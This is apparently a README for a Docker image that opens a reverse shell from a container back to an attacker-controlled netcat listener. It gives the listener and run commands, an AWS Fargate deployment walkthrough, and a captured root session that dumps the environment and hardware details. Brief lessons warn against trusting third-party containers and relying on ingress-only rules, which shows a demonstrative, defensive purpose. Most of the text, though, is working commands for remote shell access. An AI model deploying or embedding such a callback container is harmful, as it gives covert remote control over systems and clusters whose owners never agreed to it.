# Reverse Shell Container

Run a container which connects to a server with a reverse shell.

## Usage of the remote shell container

Follow these steps to connect back to a shell from within a container.

### Start the server

The reverse shell in the container will connect back to your server.
Open up a port with the following snippet:

```bash
nc -lvvp 6666
```

### optional: Build the image

```bash
docker build -t ayeks/reverse_shell:latest .
```

### Execute the image

Run the reverse shell container with: `docker run --rm -it -e IP=192.168.178.26 -e PORT=6666 ayeks/reverse_shell`

## Start the reverse shell container in AWS Fargate

We all run 3rd party components in our kubernetes clusters but couldn't
care less about it. This example shows how to setup the reverse shell
as a Fargate Container and how it connects back to an EC2 server.

### Setup the AWS Security Groups

Create a reference security group for the container which we will allow
as ingress at our server.

* Security Group Name: `sg_reverse_shell_reference`
* Inbound Rules: none
* Outbound Rules:
  * `All traffic All All 0.0.0.0/0`

Create a security group for your server that allows you to connect to it via
SSH from home and with the reverse shell from the container.

* Security Group Name: `sg_server`
* Inbound Rules:
  * `All TCP TCP 0 - 65535 sg-RANDOMNUMBER(sg_reverse_shell_reference)`
  * `SSH TCP 22 YOUR_PUBLIC_IP/32`
* Outbound Rules: all TCP, all IPs:
  * `All traffic All All 0.0.0.0/0`

### Setup the AWS EC2 server

Just choose a EC2 machine that you like. Attach the securitygroup
`sg_server` to this machine. Start the server and connect to it via SSH.

### Create a new container tasks definition

Create a new task definition for the reverse shell container. Only add the
necessary information.

* Task Definition Name: `reverse_shell`
* Task Memory: `0.5GB`
* Task CPU: `0.25 vCPU`
* Container Definition:
  * Container Name: `reverse_shell`
  * Image: `ayeks/reverse_shell`
  * Memory Limit: `Soft limit 400`
  * Environment Variables:
    * `IP` - `your servers internal IP adress`
    * `Port` - `6666`

### Start the reverse shell container in AWS ECS

Before you run the task make sure that you listen for the container at your server:

```bash
nc -lvvp 6666
```

Now go to your cluster and hit *run task*:

* Launch Type: `Fargate`
* Task Definition: `reverse_shell`
* Cluster VPC: `your favourite VPC`
* Subnets: `your favourite subnet`
* Security Groups: edit and select the existing: `sg_reverse_shell_reference`
* Auto-assign public IP: `Enabled` <- without that you cannot pull the image from Docker hub

As a result the container should connect back to your server. You are now able to execute commands directly in the container, eg. `uname -a`:

```bash
[ec2-user@ip-172-31-39-189 ~]$ nc -lvvp 6666
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 172.31.2.37.
Ncat: Connection from 172.31.2.37:56656.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-172-31-2-37:/# uname -a
uname -a
Linux ip-172-31-2-37.eu-west-1.compute.internal 4.14.158-129.185.amzn2.x86_64 #1 SMP Tue Dec 24 03:15:32 UTC 2019 x86_64 GNU/Linux
```

Just printing the environment variables.

```bash
root@ip-172-31-2-37:/# env
env
AWS_EXECUTION_ENV=AWS_ECS_FARGATE
HOSTNAME=ip-172-31-2-37.eu-west-1.compute.internal
AWS_DEFAULT_REGION=eu-west-1
AWS_REGION=eu-west-1
PWD=/
PORT=6666
HOME=/root
IP=172.31.39.189
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/b9fa9196-e49a-4140-ae3b-bd7322cfbd44
SHLVL=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

Or after installation with apt-get, you can run `lshw`:

```bash
root@ip-172-31-2-37:/# lshw
lshw
ip-172-31-2-37.eu-west-1.compute.internal
  description: Computer
  width: 64 bits
  capabilities: smp vsyscall32
  *-core
     description: Motherboard
     physical id: 0
   *-memory
      description: System memory
      physical id: 0
      size: 4GiB
   *-cpu
      product: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
      vendor: Intel Corp.
      physical id: 1
      bus info: cpu@0
      width: 64 bits
...
```

### Troubleshooting

If your container task does not reach the state `RUNNING` but goes
into `STOPPED` have a look the reason. If the container is not able to
connect to your server it just dies and returns `Exit Code 1`.
Check the security groups and other networking topics if that happens.

### Lessons Learned

* think twice before using random containers from the internet
* do not assume you are save, just because you dont allow ingress traffic
* do not run the container as root user because you install interesting software with it
* strip the container base image down as much as possible to reduce available tools
